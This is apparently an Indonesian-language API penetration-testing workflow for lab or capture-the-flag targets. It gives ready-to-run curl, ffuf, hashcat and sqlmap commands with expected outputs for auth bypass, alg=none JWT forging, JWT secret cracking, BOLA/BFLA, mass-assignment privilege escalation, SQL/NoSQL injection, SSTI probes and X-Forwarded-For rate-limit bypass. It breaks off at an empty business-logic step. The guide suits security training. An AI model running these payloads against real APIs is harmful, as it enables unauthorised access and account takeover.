[ ] GraphQL resolver authorization tested
[ ] GraphQL aliases tested
[ ] GraphQL batching tested
[ ] GraphQL complexity/depth tested
[ ] CORS headers inspected
[ ] SSRF candidates tested
[ ] File upload API tested
[ ] WebSocket handshake tested
[ ] WebSocket authorization tested
[ ] Error messages inspected
[ ] Response schemas compared
[ ] Sensitive data exposure checked
[ ] Every interesting result manually reproduced
[ ] Impact documented
```

---

# 🔀 14. Cross-Workflow

## API ↔ JWT

```text
API
 │
 ▼
Authorization: Bearer
 │
 ▼
JWT
 │
 ├── alg
 ├── claims
 ├── signature
 └── expiry
```

Cross-reference:

```text
→ [File 28: JWT](/docs/jwt)
```

---

## API ↔ CSRF

Jika API:

```text
Cookie-based authentication
```

maka CSRF tetap relevan.

```text
API
 │
 ▼
Cookie Auth
 │
 ▼
State-changing request
 │
 ▼
CSRF
```

Cross-reference:

```text
→ [File 29: CSRF](/docs/csrf)
```

---

## API ↔ SQLi

```text
JSON
 │
 ▼
API parameter
 │
 ▼
SQL query
 │
 ▼
SQLi
```

Cross-reference:

```text
→ [File 19: SQL Injection](/docs/sql-injection)
```

---

## API ↔ SSRF

```text
API
 │
 ▼
url parameter
 │
 ▼
Server fetch
 │
 ▼
SSRF
```

Cross-reference:

```text
→ [File 22: SSRF](/docs/ssrf)
```

---

## API ↔ XSS

API dapat mengembalikan:

```json
{
  "bio": "<script>alert(1)</script>"
}
```

API sendiri mungkin hanya menyimpan data.

Vulnerability muncul ketika frontend:

```javascript
element.innerHTML = data.bio;
```

Cross-reference:

```text
→ [File 20: XSS](/docs/xss)
```

---

## API ↔ File Upload

```text
API
 │
 ▼
multipart
 │
 ▼
file
 │
 ├── parser
 ├── storage
 ├── MIME
 ├── extension
 └── execution
```

---

## API ↔ XXE

```text
API
 │
 ▼
XML upload/body
 │
 ▼
XML Parser
 │
 ▼
XXE
```

Cross-reference:

```text
→ [File 21: XXE](/docs/xxe)
```

---

## API ↔ SSTI

```text
JSON
 │
 ▼
template field
 │
 ▼
template engine
 │
 ▼
SSTI
```

Cross-reference:

```text
→ [File 23: SSTI](/docs/ssti)
```

---

# 🧠 15. One-Line Muscle Memory

```text
API = Endpoint → Auth → Object → Function → Property → Input → Resource → Business Logic → Impact
```

Versi operasional:

```text
DISCOVER
   ↓
IDENTIFY AUTH
   ↓
TEST AUTHORIZATION
   ↓
BOLA?
   ↓
BFLA?
   ↓
PROPERTY?
   ↓
INJECTION?
   ↓
RATE LIMIT?
   ↓
BUSINESS LOGIC?
   ↓
GRAPHQL?
   ↓
CORS?
   ↓
SSRF?
   ↓
UPLOAD?
   ↓
WEBSOCKET?
   ↓
VERSIONING?
   ↓
IMPACT
```

---

# 🎯 Quick CTF Recipe

Ketemu:

```text
GET /api/v1/users/1001
Authorization: Bearer TOKEN
```

Jangan langsung fuzz.

Lakukan:

```text
1. Identify API type
        ↓
2. Understand authentication
        ↓
3. Obtain User A/B sessions
        ↓
4. User A owns object 1001
        ↓
5. User B requests object 1001
        ↓
6. 200?
        ↓
7. BOLA candidate
```

Kemudian:

```text
GET /api/v1/users/1001
        ↓
Can User B MODIFY?
        ↓
PUT/PATCH
        ↓
Can User B DELETE?
        ↓
DELETE
        ↓
Can User B access admin function?
        ↓
BFLA
```

Lanjut:

```text
Response
   ↓
Hidden fields?
   ↓
Mass Assignment?
   ↓
Injection?
   ↓
Rate Limit?
   ↓
Business Logic?
```

---

# 🔥 API Pentest Core Model

```text
                    API
                     │
          ┌──────────┼──────────┐
          ▼          ▼          ▼
      AUTHENTIC    AUTHORIZED   INPUT
          │          │          │
          │      ┌───┼───┐      │
          │      ▼   ▼   ▼      │
          │    Object Function Property
          │      │    │    │     │
          │      │    │    │     ├── SQLi
          │      │    │    │     ├── NoSQLi
          │      │    │    │     ├── SSTI
          │      │    │    │     └── Cmd Injection
          │      │    │    │
          └──────┴────┴────┴─────────────┐
                                          ▼
                                  BUSINESS LOGIC
                                          │
                         ┌────────────────┼───────────────┐
                         ▼                ▼               ▼
                      RATE LIMIT       WORKFLOW        RESOURCE
                         │                │               │
                         └────────────────┼───────────────┘
                                          ▼
                                       IMPACT
```

---

# 🚦 Final API Testing Sequence

```text
┌─────────────────────────────┐
│ 1. DISCOVER                 │
│ endpoints / docs / versions │
└──────────────┬──────────────┘
               ▼
┌─────────────────────────────┐
│ 2. AUTHENTICATION           │
│ API key / JWT / OAuth       │
└──────────────┬──────────────┘
               ▼
┌─────────────────────────────┐
│ 3. AUTHORIZATION            │
│ BOLA / BFLA / Property      │
└──────────────┬──────────────┘
               ▼
┌─────────────────────────────┐
│ 4. INPUT VALIDATION         │
│ SQLi / NoSQLi / SSTI / CMD  │
└──────────────┬──────────────┘
               ▼
┌─────────────────────────────┐
│ 5. RESOURCE CONTROL         │
│ rate / size / depth         │
└──────────────┬──────────────┘
               ▼
┌─────────────────────────────┐
│ 6. BUSINESS LOGIC           │
│ price / coupon / workflow   │
└──────────────┬──────────────┘
               ▼
┌─────────────────────────────┐
│ 7. API-SPECIFIC             │
│ GraphQL / SSRF / CORS / WS  │
└──────────────┬──────────────┘
               ▼
┌─────────────────────────────┐
│ 8. VALIDATE IMPACT          │
│ reproduce + document        │
└─────────────────────────────┘
```

---
# 30 — API Security Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="http://api.target.htb"
export LHOST="10.10.14.5"
export TOKEN_A=""          # Token user A (kamu)
export TOKEN_B=""          # Token user B (victim/second account)
export API_KEY=""          # API Key jika digunakan
mkdir -p ~/api_loot/{endpoints,responses,evidence,tokens}
cd ~/api_loot

echo "[*] Target: $TARGET"
echo "[*] Token A: ${TOKEN_A:0:20}..."
```

**Output yang diharapkan:**

text

```
[*] Target: http://api.target.htb
[*] Token A: eyJhbGciOiJIUzI1...
```

---

## ═══════════════════════════════════════

## FASE 0: API DISCOVERY — BANGUN INVENTORY

## ═══════════════════════════════════════

> **Tujuan:** Temukan SEMUA endpoint sebelum testing. Jangan langsung exploit tanpa peta.

### Langkah 0.1 — Identifikasi Tipe API (REST / GraphQL / SOAP)

Bash

```
# Command 1: Cek endpoint umum API
curl -si "$TARGET/" | head -20
curl -si "$TARGET/api/" | head -5
curl -si "$TARGET/graphql" | head -5
curl -si "$TARGET/api/v1/" | head -5

# Command 2: Cek Content-Type response (petunjuk tipe API)
curl -si -H "Accept: application/json" "$TARGET/" | grep -i "content-type"

# Command 3: Cek apakah ada GraphQL
curl -si -X POST "$TARGET/graphql" \
    -H "Content-Type: application/json" \
    --data '{"query":"{ __typename }"}' | head -20
```

**OUTPUT BERHASIL ✅ — REST API ditemukan:**

http

```
HTTP/1.1 200 OK
Content-Type: application/json
{"version":"1.0","endpoints":["/api/v1/"]}
```

➡️ REST API. Lanjut ke **Langkah 0.2** untuk endpoint discovery.

**OUTPUT BERHASIL ✅ — GraphQL ditemukan:**

JSON

```
{"data":{"__typename":"Query"}}
```

➡️ GraphQL API! Langsung ke **FASE 0G (GraphQL Discovery)**.

**OUTPUT GAGAL ❌ — 404 atau HTML response:**

HTML

```
<!DOCTYPE html>...
```

➡️ API mungkin di path berbeda. Lanjut ke **Langkah 0.2** untuk fuzzing.

---

### Langkah 0.2 — Endpoint Discovery (Fuzzing + JS Recon)

Bash

```
# Command 1: ffuf untuk API endpoint discovery
ffuf -u "$TARGET/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -mc 200,201,204,301,302,307,401,403 \
    -o ~/api_loot/endpoints/ffuf_results.json \
    -of json 2>/dev/null | tee ~/api_loot/endpoints/ffuf_output.txt

# Command 2: Cari di JavaScript files
curl -s "$TARGET/" | grep -oE 'src="[^"]+\.js"' | sed 's/src="//;s/"//'
# Untuk setiap JS file yang ditemukan:
curl -s "$TARGET/static/app.js" | \
    grep -oE '"(/api/|/v[0-9]+/|/graphql)[^"]*"' | \
    sort -u | tee ~/api_loot/endpoints/js_endpoints.txt

# Command 3: Cek dokumentasi yang exposed
for path in /swagger.json /openapi.json /swagger-ui/ /api-docs /redoc /swagger.yaml; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" "$TARGET$path")
    echo "$path -> $STATUS"
done

# Command 4: robots.txt
curl -s "$TARGET/robots.txt"
```

**OUTPUT BERHASIL ✅ — Swagger/OpenAPI ditemukan:**

text

```
/swagger.json -> 200
/api-docs -> 200
```

Bash

```
# JACKPOT! Extract semua endpoint dari OpenAPI spec
curl -s "$TARGET/openapi.json" | jq -r '.paths | keys[]' | \
    tee ~/api_loot/endpoints/api_paths.txt

echo "[*] Total endpoints: $(wc -l < ~/api_loot/endpoints/api_paths.txt)"
```

**OUTPUT BERHASIL ✅ — Daftar endpoint didapat:**

text

```
/api/v1/users
/api/v1/orders
/api/v1/admin/users
/api/v1/products
/api/v2/profile
[*] Total endpoints: 23
```

➡️ **SIMPAN SEMUA:** Ini adalah attack surface kamu. Lanjut ke **Fase 1**.

**OUTPUT GAGAL ❌ — Tidak ada dokumentasi:**

text

```
/swagger.json -> 404
/api-docs -> 404
```

➡️ Manual discovery. Lanjut ke ffuf hasil dan JS recon. Periksa `~/api_loot/endpoints/js_endpoints.txt`.

---

### Langkah 0.3 — API Version Discovery (Old Version = Less Security!)

Bash

```
# Cek semua versi yang mungkin ada
for v in v1 v2 v3 v4 internal private beta debug admin; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" "$TARGET/api/$v/")
    [[ "$STATUS" != "404" ]] && echo "[+] /api/$v/ -> $STATUS"
done

# Bandingkan endpoint di versi berbeda
curl -si "$TARGET/api/v1/users" -H "Authorization: Bearer $TOKEN_A" | head -5
curl -si "$TARGET/api/v2/users" -H "Authorization: Bearer $TOKEN_A" | head -5
```

**OUTPUT BERHASIL ✅ — Old version masih aktif:**

text

```
[+] /api/v1/ -> 200
[+] /api/v2/ -> 200
[+] /api/internal/ -> 200  ← MENARIK!
```

➡️ `/api/internal/` mungkin **tidak punya auth yang sama**! Catat dan test nanti di Fase 2.

---

### FASE 0G — GraphQL Khusus Discovery

Bash

```
# Langkah G1: Full introspection
curl -s -X POST "$TARGET/graphql" \
    -H "Content-Type: application/json" \
    --data '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind fields { name args { name type { name kind } } type { name kind } } } } }"}' \
    | python3 -m json.tool > ~/api_loot/endpoints/graphql_schema.json

echo "[*] Schema saved. Types found:"
cat ~/api_loot/endpoints/graphql_schema.json | \
    python3 -c "import json,sys; schema=json.load(sys.stdin); \
    [print(t['name']) for t in schema.get('data',{}).get('__schema',{}).get('types',[]) \
    if not t['name'].startswith('__')]"
```

**OUTPUT BERHASIL ✅ — Schema didapat:**

JSON

```
{
  "data": {
    "__schema": {
      "queryType": {"name": "Query"},
      "mutationType": {"name": "Mutation"},
      "types": [
        {"name": "User", "kind": "OBJECT"},
        {"name": "AdminUser", "kind": "OBJECT"},
        {"name": "Order", "kind": "OBJECT"}
      ]
    }
  }
}
```

➡️ Catat semua type! `AdminUser` sangat menarik → test authorization di Fase 3.

**OUTPUT GAGAL ❌ — Introspection disabled:**

JSON

```
{"errors":[{"message":"GraphQL introspection is not allowed"}]}
```

➡️ Production hardening. Coba teknik alternatif:

Bash

```
# Coba query field yang kemungkinan ada berdasarkan naming convention
curl -s -X POST "$TARGET/graphql" \
    -H "Content-Type: application/json" \
    --data '{"query":"{ users { id username email } }"}' | python3 -m json.tool

curl -s -X POST "$TARGET/graphql" \
    -H "Content-Type: application/json" \
    --data '{"query":"{ me { id username role } }"}' | python3 -m json.tool
```

---

## ═══════════════════════════════════════

## FASE 1: AUTHENTICATION TESTING

## ═══════════════════════════════════════

> **Tujuan:** Pahami auth mechanism dan cari bypass.

### Langkah 1.1 — Identifikasi Authentication Type

Bash

```
# Lihat header response dari endpoint protected
curl -si "$TARGET/api/v1/profile" | grep -iE "(www-authenticate|authorization|set-cookie)"

# Test tanpa credentials dulu
curl -si "$TARGET/api/v1/profile"
curl -si "$TARGET/api/v1/users"
curl -si "$TARGET/api/v1/admin/users"
```

**OUTPUT: API Key Auth:**

http

```
HTTP/1.1 401 Unauthorized
{"message":"API key required"}
```

**OUTPUT: Bearer/JWT:**

http

```
HTTP/1.1 401 Unauthorized
{"message":"No token provided"}
```

**OUTPUT MENARIK ✅ — Endpoint accessible tanpa auth:**

http

```
HTTP/1.1 200 OK
[{"id":1,"username":"admin"},{"id":2,"username":"user"}]
```

➡️ **Missing Authentication! BOLA/BFLA potential.** Dokumentasikan langsung.

---

### Langkah 1.2 — Test Authentication Bypass Patterns

Bash

```
# Test 1: Null/empty token
curl -si "$TARGET/api/v1/profile" -H "Authorization: Bearer "
curl -si "$TARGET/api/v1/profile" -H "Authorization: Bearer null"
curl -si "$TARGET/api/v1/profile" -H "Authorization: Bearer undefined"

# Test 2: Cek apakah endpoint dengan versi lama bypass auth
curl -si "$TARGET/api/v1/admin/users" -H "Authorization: Bearer $TOKEN_A"
curl -si "$TARGET/v1/admin/users" -H "Authorization: Bearer $TOKEN_A"    # tanpa /api

# Test 3: Parameter-based auth bypass
curl -si "$TARGET/api/v1/profile?is_admin=true" -H "Authorization: Bearer $TOKEN_A"
curl -si "$TARGET/api/v1/profile?admin=1" -H "Authorization: Bearer $TOKEN_A"
curl -si "$TARGET/api/v1/profile?role=admin" -H "Authorization: Bearer $TOKEN_A"

# Test 4: Method override
curl -si -X POST "$TARGET/api/v1/admin/users" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "X-HTTP-Method-Override: GET"
```

**OUTPUT BERHASIL ✅ — Parameter bypass bekerja:**

JSON

```
{"users":[{"id":1,"username":"admin","role":"admin"},{"id":2,"username":"user"}]}
```

➡️ **BFLA + Broken Auth via parameter!** Dokumentasikan.

---

### Langkah 1.3 — JWT Analysis (Jika menggunakan Bearer JWT)

Bash

```
# Decode JWT tanpa library
export TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJ1c2VyIn0.signature"

python3 - << 'EOF'
import base64, json, sys, os
token = os.environ.get('TOKEN', '')
parts = token.split('.')
for name, part in zip(['HEADER', 'PAYLOAD'], parts[:2]):
    part += '=' * (-len(part) % 4)
    decoded = base64.urlsafe_b64decode(part)
    print(f"\n=== {name} ===")
    print(json.dumps(json.loads(decoded), indent=2))
EOF
```

**OUTPUT BERHASIL ✅ — JWT decoded:**

JSON

```
=== HEADER ===
{
  "alg": "HS256",
  "typ": "JWT"
}
=== PAYLOAD ===
{
  "sub": "user1",
  "role": "user",
  "exp": 1735689600
}
```

Bash

```
# Test alg=none bypass (jika HEADER menunjukkan HS256/RS256)
# Buat token palsu dengan alg:none
python3 - << 'EOF'
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "exp": 9999999999}

h = b64url(json.dumps(header).encode())
p = b64url(json.dumps(payload).encode())
token = f"{h}.{p}."
print(f"[*] alg=none token: {token}")
EOF

# Test token hasil
curl -si "$TARGET/api/v1/admin/users" \
    -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD."
```

**OUTPUT BERHASIL ✅ — alg=none bypass bekerja:**

JSON

```
{"users":[{"id":1,"username":"admin"}]}
```

➡️ **CRITICAL! JWT algorithm confusion.** Lanjut ke `[🔐 28 — JWT Workflow](/docs/jwt)`.

Bash

```
# Test weak secret cracking
echo "$TOKEN" > ~/api_loot/tokens/jwt.txt
hashcat -m 16500 ~/api_loot/tokens/jwt.txt \
    /usr/share/wordlists/rockyou.txt --force 2>/dev/null | grep -v "^#"
```

**OUTPUT BERHASIL ✅ — Secret cracked:**

text

```
eyJhbGc...:secret123
```

➡️ Forge token dengan secret tersebut. Lihat `[🔐 28 — JWT Workflow](/docs/jwt)`.

---

## ═══════════════════════════════════════

## FASE 2: AUTHORIZATION TESTING — BOLA

## ═══════════════════════════════════════

> **BOLA = Broken Object Level Authorization:** User bisa akses object milik user lain dengan ganti ID.

### Langkah 2.1 — Setup Dua Akun dan Identifikasi Object ID

Bash

```
# Login dengan user A dan B, simpan token
# Asumsikan kamu sudah punya dua akun di lab

# User A - buat object (order/profile/post)
curl -si -X POST "$TARGET/api/v1/orders" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{"product_id":1,"quantity":2}' | tee ~/api_loot/evidence/create_order.txt

# Lihat object ID yang dibuat
OBJECT_ID=$(curl -s "$TARGET/api/v1/orders" \
    -H "Authorization: Bearer $TOKEN_A" | \
    python3 -c "import json,sys; data=json.load(sys.stdin); print(data[0]['id'])")
echo "[*] Object ID milik User A: $OBJECT_ID"
```

---

### Langkah 2.2 — BOLA Test: User B akses Object User A

Bash

```
# THE CORE BOLA TEST
echo "[*] Testing BOLA: User B mengakses object $OBJECT_ID milik User A"

# Test GET (read)
echo "=== GET ==="
curl -si "$TARGET/api/v1/orders/$OBJECT_ID" \
    -H "Authorization: Bearer $TOKEN_B"

# Test PATCH (modify)
echo "=== PATCH ==="
curl -si -X PATCH "$TARGET/api/v1/orders/$OBJECT_ID" \
    -H "Authorization: Bearer $TOKEN_B" \
    -H "Content-Type: application/json" \
    --data '{"quantity":100}'

# Test DELETE (hapus)
echo "=== DELETE ==="
curl -si -X DELETE "$TARGET/api/v1/orders/$OBJECT_ID" \
    -H "Authorization: Bearer $TOKEN_B"
```

**OUTPUT BERHASIL ✅ — BOLA Confirmed (GET berhasil):**

http

```
HTTP/1.1 200 OK
{"id":1001,"user_id":"user_a","product":"Premium Item","quantity":2}
```

➡️ **BOLA DITEMUKAN!** User B bisa baca order milik User A.

Bash

```
# Dokumentasikan dengan lengkap
cat > ~/api_loot/evidence/bola_proof.txt << EOF
BOLA VULNERABILITY CONFIRMED
Endpoint: GET $TARGET/api/v1/orders/$OBJECT_ID
User A Token: $TOKEN_A (owner)
User B Token: $TOKEN_B (unauthorized)
Result: HTTP 200 - Data exposed

Response Body:
$(curl -s "$TARGET/api/v1/orders/$OBJECT_ID" -H "Authorization: Bearer $TOKEN_B")
EOF

echo "[+] Evidence saved!"
```

**OUTPUT AMAN ✅ — Authorization bekerja:**

http

```
HTTP/1.1 403 Forbidden
{"message":"Access denied"}
```

➡️ BOLA tidak berhasil untuk endpoint ini. Test endpoint lain atau lanjut ke BFLA.

---

### Langkah 2.3 — ID Enumeration (Expand BOLA Scope)

Bash

```
# Buat wordlist ID untuk test
seq 1 100 > /tmp/ids.txt

# Fuzz semua ID sebagai User B
ffuf -u "$TARGET/api/v1/orders/FUZZ" \
    -w /tmp/ids.txt \
    -H "Authorization: Bearer $TOKEN_B" \
    -mc 200 \
    -o ~/api_loot/evidence/bola_enum.json

echo "[*] Objects accessible oleh User B:"
cat ~/api_loot/evidence/bola_enum.json | python3 -c "
import json,sys
data = json.load(sys.stdin)
for r in data.get('results',[]):
    print(f\"ID: {r['input']['FUZZ']} -> {r['status']}\")
"
```

**OUTPUT BERHASIL ✅ — Multiple objects accessible:**

text

```
[*] Objects accessible oleh User B:
ID: 5 -> 200
ID: 12 -> 200
ID: 33 -> 200
ID: 67 -> 200
```

➡️ Semua order user lain bisa diakses! Impact HIGH.

---

## ═══════════════════════════════════════

## FASE 3: AUTHORIZATION TESTING — BFLA

## ═══════════════════════════════════════

> **BFLA = Broken Function Level Authorization:** Normal user bisa panggil function admin.

### Langkah 3.1 — Discover Admin/Privileged Endpoints

Bash

```
# Fuzz untuk admin endpoints
ffuf -u "$TARGET/api/v1/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -H "Authorization: Bearer $TOKEN_A" \
    -mc 200,201,403,405 \
    -o ~/api_loot/endpoints/all_endpoints.json 2>/dev/null

# Filter endpoint menarik (admin, internal, etc)
cat ~/api_loot/endpoints/all_endpoints.json | python3 -c "
import json,sys
data = json.load(sys.stdin)
for r in data.get('results',[]):
    w = r['input']['FUZZ'].lower()
    if any(k in w for k in ['admin','internal','manage','debug','priv','root','super']):
        print(f\"{r['input']['FUZZ']} -> {r['status']}\")
"
```

**OUTPUT BERHASIL ✅ — Admin endpoints ditemukan:**

text

```
admin -> 403
admin/users -> 403
admin/reset -> 403
management/users -> 403
```

➡️ Ada admin endpoints! Test apakah user biasa bisa akses.

---

### Langkah 3.2 — BFLA Test: Normal User → Admin Function

Bash

```
# Test setiap HTTP method pada admin endpoint
for METHOD in GET POST PUT PATCH DELETE; do
    echo "=== $METHOD /api/v1/admin/users ==="
    curl -si -X "$METHOD" "$TARGET/api/v1/admin/users" \
        -H "Authorization: Bearer $TOKEN_A" \
        -H "Content-Type: application/json" \
        --data '{"action":"list"}' 2>/dev/null | head -3
    sleep 0.5
done

# Test dengan role manipulation di JWT atau parameter
curl -si "$TARGET/api/v1/admin/users" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "X-Role: admin" \
    -H "X-User-Role: admin"

# Test dengan specific admin actions
curl -si -X POST "$TARGET/api/v1/admin/users/2/promote" \
    -H "Authorization: Bearer $TOKEN_A"

curl -si -X DELETE "$TARGET/api/v1/admin/users/2" \
    -H "Authorization: Bearer $TOKEN_A"
```

**OUTPUT BERHASIL ✅ — BFLA via method mismatch:**

http

```
# GET blocked (403)
HTTP/1.1 403 Forbidden

# POST succeeds! (server hanya cek GET)
HTTP/1.1 200 OK
{"users":[{"id":1,"username":"admin","role":"admin"},...]}
```

➡️ **BFLA! Server hanya enforce auth untuk GET, bukan POST.**

---

## ═══════════════════════════════════════

## FASE 4: MASS ASSIGNMENT & PROPERTY ABUSE

## ═══════════════════════════════════════

### Langkah 4.1 — Identifikasi Hidden Fields dari Response

Bash

```
# Lihat SEMUA field yang dikembalikan API
curl -s "$TARGET/api/v1/profile" \
    -H "Authorization: Bearer $TOKEN_A" | python3 -m json.tool

# Cari field sensitif
curl -s "$TARGET/api/v1/profile" \
    -H "Authorization: Bearer $TOKEN_A" | \
    python3 -c "
import json,sys
data = json.load(sys.stdin)
sensitive = ['role','isAdmin','admin','verified','balance','permissions','level','tier','credit']
found = [k for k in data.keys() if any(s in k.lower() for s in sensitive)]
print('[*] Sensitive fields found:', found)
print('[*] Full response:')
print(json.dumps(data, indent=2))
"
```

**OUTPUT BERHASIL ✅ — Hidden fields ditemukan:**

JSON

```
{
  "id": 2,
  "username": "user1",
  "email": "user@test.com",
  "role": "user",
  "isAdmin": false,
  "balance": 100.00,
  "verified": false
}
```

➡️ Ada `role`, `isAdmin`, `verified` → coba mass assignment!

---

### Langkah 4.2 — Mass Assignment Test

Bash

```
# Test apakah bisa set role=admin via update profile
curl -si -X PATCH "$TARGET/api/v1/profile" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{
        "display_name": "user1",
        "role": "admin",
        "isAdmin": true,
        "verified": true,
        "balance": 99999
    }'

# Verifikasi apakah berubah
sleep 1
curl -s "$TARGET/api/v1/profile" -H "Authorization: Bearer $TOKEN_A" | \
    python3 -c "import json,sys; d=json.load(sys.stdin); print(f'role={d.get(\"role\")}, isAdmin={d.get(\"isAdmin\")}')"
```

**OUTPUT BERHASIL ✅ — Mass Assignment berhasil:**

http

```
HTTP/1.1 200 OK
{"message":"Profile updated"}
```

text

```
role=admin, isAdmin=True
```

➡️ **CRITICAL! Privilege escalation via mass assignment!**

Bash

```
# Verifikasi dengan akses admin endpoint
curl -si "$TARGET/api/v1/admin/users" \
    -H "Authorization: Bearer $TOKEN_A"
# Harus sekarang return 200!
```

**OUTPUT GAGAL ❌ — Field diabaikan:**

JSON

```
{"display_name":"user1"}
# role dan isAdmin tidak berubah
```

➡️ Server punya allowlist. Coba variasi field name lain:

Bash

```
# Coba variasi nama field
for field in "user_role" "account_type" "membership" "tier" "admin_flag" "is_admin" "is_superuser"; do
    curl -si -X PATCH "$TARGET/api/v1/profile" \
        -H "Authorization: Bearer $TOKEN_A" \
        -H "Content-Type: application/json" \
        --data "{\"$field\":\"admin\"}" 2>/dev/null | grep -E "(200|400|403)" | head -1
    echo "  ↑ field: $field"
done
```

---

## ═══════════════════════════════════════

## FASE 5: INJECTION TESTING VIA API

## ═══════════════════════════════════════

### Langkah 5.1 — SQL Injection via JSON

Bash

```
# Identifikasi parameter yang mungkin ke database
# Test setiap input parameter yang ada di endpoint

# SQLi via JSON body
curl -si -X POST "$TARGET/api/v1/users/search" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{"username":"admin'\''"}' | head -10

# SQLi via query parameter
curl -si "$TARGET/api/v1/users?id=1'" \
    -H "Authorization: Bearer $TOKEN_A" | head -10

# SQLi boolean-based
curl -si "$TARGET/api/v1/users?id=1 AND 1=1--" \
    -H "Authorization: Bearer $TOKEN_A"
curl -si "$TARGET/api/v1/users?id=1 AND 1=2--" \
    -H "Authorization: Bearer $TOKEN_A"
```

**OUTPUT BERHASIL ✅ — SQLi error:**

text

```
{"error":"You have an error in your SQL syntax near '''"}
```

➡️ **SQLi ditemukan!** Lanjut ke `[💉 19 — SQL Injection Workflow](/docs/sql-injection)` untuk full exploitation.

Bash

```
# Quick SQLmap untuk confirm
sqlmap -u "$TARGET/api/v1/users?id=1" \
    -H "Authorization: Bearer $TOKEN_A" \
    --dbs --batch --level 2
```

---

### Langkah 5.2 — NoSQL Injection (MongoDB)

Bash

```
# Test operator injection
curl -si -X POST "$TARGET/api/v1/login" \
    -H "Content-Type: application/json" \
    --data '{"username":"admin","password":{"$ne":null}}'

curl -si -X POST "$TARGET/api/v1/login" \
    -H "Content-Type: application/json" \
    --data '{"username":{"$regex":".*"},"password":{"$ne":""}}'

# Coba $where operator
curl -si -X POST "$TARGET/api/v1/users/search" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{"$where":"this.role=='\''admin'\''"}'
```

**OUTPUT BERHASIL ✅ — NoSQLi login bypass:**

JSON

```
{"token":"eyJhbGc...","user":{"username":"admin","role":"admin"}}
```

➡️ **NoSQLi bypass! Admin access didapat.**

---

### Langkah 5.3 — SSTI via API Template Field

Bash

```
# Test field yang mungkin dirender oleh template engine
curl -si -X POST "$TARGET/api/v1/notifications/send" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{"message":"{{7*7}}"}'

curl -si -X PATCH "$TARGET/api/v1/profile" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{"bio":"{{7*7}}"}'

# Cek hasilnya
curl -s "$TARGET/api/v1/profile" -H "Authorization: Bearer $TOKEN_A" | \
    python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('bio',''))"
```

**OUTPUT BERHASIL ✅ — SSTI confirmed:**

JSON

```
{"bio": "49"}
```

➡️ `{{7*7}}` = 49 → **SSTI ditemukan!** Lanjut ke `<a href="/docs/ssti" class="text-[#00b4d8] hover:underline font-mono font-semibold">23_ssti_workflow.md</a>`.

---

## ═══════════════════════════════════════

## FASE 6: RATE LIMITING & BUSINESS LOGIC

## ═══════════════════════════════════════

### Langkah 6.1 — Rate Limit Testing

Bash

```
# PENTING: Jangan aggressive di target real. Di lab, test controlled.
# Test 1: Baseline single request
curl -si "$TARGET/api/v1/login" \
    -H "Content-Type: application/json" \
    --data '{"username":"test","password":"test"}' | grep -E "(HTTP|Retry|Rate)"

# Test 2: Multiple requests
for i in $(seq 1 10); do
    RESULT=$(curl -so /dev/null -w "%{http_code}" \
        -X POST "$TARGET/api/v1/login" \
        -H "Content-Type: application/json" \
        --data '{"username":"test","password":"test"}')
    echo "Request $i: HTTP $RESULT"
    sleep 0.1
done
```

**OUTPUT BERHASIL ✅ — Rate limit ada:**

text

```
Request 1: HTTP 401
Request 2: HTTP 401
...
Request 5: HTTP 429   ← Rate limit terpicu!
```

➡️ Catat threshold. Jangan bypass paksa di real engagement.

**OUTPUT GAGAL ❌ — Tidak ada rate limit:**

text

```
Request 1-50: HTTP 401  (semua sama)
```

➡️ **No rate limiting!** Ini vulnerability. Bisa brute force.

Bash

```
# Test apakah X-Forwarded-For bisa bypass rate limit
for i in $(seq 1 20); do
    curl -so /dev/null -w "%{http_code}\n" \
        -X POST "$TARGET/api/v1/login" \
        -H "X-Forwarded-For: 192.168.$i.1" \
        -H "Content-Type: application/json" \
        --data '{"username":"admin","password":"password"}'
done
```

**OUTPUT BERHASIL ✅ — X-Forwarded-For bypass rate limit:**

text

```
401 401 401 401 401...  (tidak ada 429!)
```

➡️ Server percaya `X-Forwarded-For` header → rate limit bypass possible!

---

### Langkah 6.2 — API Versioning Abuse

Bash

```
# Bandingkan security antara v1 dan v2
echo "=== v1 auth check ==="
curl -si "$TARGET/api/v1/admin/users" | head -3

echo "=== v2 auth check ==="
curl -si "$TARGET/api/v2/admin/users" | head -3

# Test apakah endpoint lama punya validasi berbeda
curl -si "$TARGET/api/v1/profile" \
    -H "Authorization: Bearer INVALID_TOKEN" | head -3

curl -si "$TARGET/v1/profile" \
    -H "Authorization: Bearer INVALID_TOKEN" | head -3
```

**OUTPUT BERHASIL ✅ — Old API version tidak ada auth:**

http

```
# /api/v2/admin/users
HTTP/1.1 403 Forbidden

# /api/v1/admin/users (versi lama!)
HTTP/1.1 200 OK
{"users":[...all users...]}
```

➡️ **BFLA via API versioning!** v1 tidak enforce auth yang sama dengan v2.

---

### Langkah 6.3 — Business Logic Testing (Price Manipulation)

Bash

```
